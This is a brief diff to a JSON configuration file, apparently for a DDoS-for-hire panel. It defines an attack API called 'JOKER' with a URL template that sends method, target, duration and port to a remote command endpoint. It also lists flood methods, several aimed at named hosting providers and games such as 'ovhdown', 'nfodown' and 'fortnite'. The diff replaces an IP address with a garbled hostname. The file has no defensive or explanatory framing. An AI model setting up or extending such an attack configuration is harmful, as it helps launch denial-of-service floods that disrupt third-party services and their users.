@@ -2,7 +2,7 @@
     "methods": [
         {
             "api_name": "JOKER",
-            "target": "http://185.196.10.155:8080/api?cmd=.[method]%20[target]%20[duration]%20dport=[port]",
+            "target": "http://185.sksjsbwbwisi:8080/api?cmd=.[method]%20[target]%20[duration]%20dport=[port]",
             "urlEncode": true,
             "attack_methods": ["udp", "udpplain", "std", "ice", "udphex", "stdhex", "vse", "dns", "home", "ack", "greip", "greeth", "killall", "ovhdown", "nfodown", "randhex", "kpac", "game", "MW", "mw", "fortnite"],
             "custom_define": [
